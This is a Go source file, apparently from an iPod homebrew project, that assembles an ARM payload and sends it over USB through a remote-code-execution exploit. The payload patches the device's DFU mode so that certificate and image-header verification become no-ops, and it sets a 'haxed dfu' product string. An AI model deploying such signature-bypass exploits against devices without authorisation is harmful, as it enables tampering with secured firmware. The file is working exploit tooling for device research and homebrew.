package haxeddfu

import (
	"fmt"
	"log"
	"strings"
	"unicode/utf16"

	"github.com/google/gousb"
	"github.com/keystone-engine/keystone/bindings/go/keystone"

	"github.com/freemyipod/wInd3x/pkg/exploit"
)

const ProductString = "haxed dfu"

func makeStringDescriptor(s string) []byte {
	descriptor := []byte{
		0, 0x03,
	}
	for _, cp := range utf16.Encode([]rune(s)) {
		descriptor = append(descriptor, uint8(cp&0xff), uint8(cp>>8))
	}
	descriptor[0] = uint8(len(descriptor))
	return descriptor
}

func Payload(ep *exploit.Parameters) ([]byte, error) {
	var descriptor []string
	for _, d := range makeStringDescriptor(ProductString) {
		descriptor = append(descriptor, fmt.Sprintf(".byte 0x%x", d))
	}
	descriptorStr := strings.Join(descriptor, "\n")

	ks, err := keystone.New(keystone.ARCH_ARM, keystone.MODE_ARM)
	if err != nil {
		return nil, fmt.Errorf("could not create assembler: %w", err)
	}
	payload, _, ok := ks.Assemble(fmt.Sprintf(`
		start:
			# Copy descriptor to scratch memory space.
			ldr r0, =0x2202d800
			ldr r1, =descriptor
			ldrb r2, [r1]

		descriptor_copy_loop:
			ldrb r3, [r1]
			strb r3, [r0]
			add r1, #1
			add r0, #1
			sub r2, #1
			cmp r2, #0
			bne descriptor_copy_loop

			# Set descriptor in g_State->dfu_state->deviceDescriptor
			ldr r0, =0x2202fff8
			ldr r0, [r0]
			ldr r0, [r0, #1584]
			ldr r2, =0x2202d800
			str r2, [r0, #24]

			# Copy state vtable to scratch.
			ldr r0, =0x2202fff8
			ldr r0, [r0]
			ldr r0, [r0, #36]
			mov r1, #0
			ldr r2, =0x2202d880
		vtable_copy_loop:
			ldr r3, [r0]
			str r3, [r2]
			add r0, #4
			add r1, #4
			add r2, #4
			cmp r1, #84
			bne vtable_copy_loop

			# Set new vtable to copy in scratch.
			ldr r0, =0x2202fff8
			ldr r0, [r0]
			ldr r1, =0x2202d880
			str r1, [r0, #36]

			# Overwrite vtable verify_{certificate,image_header} to no-ops.
			ldr r0, =0x2202d880
			ldr r1, =0x%x
			str r1, [r0, #28]
			str r1, [r0, #20]

			# Fixup LR (after trampoline blx messes it up)
			ldr lr, =0x%x
			bx lr

		# USB product string descriptor.
		descriptor:
		%s
	`, ep.Ret1Addr, ep.ReturnAddr, descriptorStr), uint64(ep.ExecAddr))
	if !ok {
		return nil, fmt.Errorf("failed to assemble payload: %s", ks.LastError())
	}

	return payload, nil
}

func Trigger(usb *gousb.Device, ep *exploit.Parameters, force bool) error {
	p, err := usb.GetStringDescriptor(2)
	if err != nil {
		return fmt.Errorf("retrieving string descriptor: %v", err)
	}
	if want, got := ProductString, p; want == got {
		if force {
			log.Printf("Device already running haxed DFU, but forcing re-upload")
		} else {
			log.Printf("Device already running haxed DFU")
			return nil
		}
	}
	log.Printf("Generating payload...")

	payload, err := Payload(ep)
	if err != nil {
		return fmt.Errorf("failed to generate payload: %w", err)
	}

	log.Printf("Running rce....")
	if err := exploit.RCE(usb, ep, payload); err != nil {
		return fmt.Errorf("failed to execute haxed dfu payload: %w", err)
	}

	// Check descriptor got changed.
	p, err = usb.GetStringDescriptor(2)
	if err != nil {
		return fmt.Errorf("retrieving string descriptor: %v", err)
	}
	if want, got := ProductString, p; want != got {
		return fmt.Errorf("string descriptor got unexpected result, wanted %q, got %q", want, got)
	}
	log.Printf("Haxed DFU running!")

	return nil

}
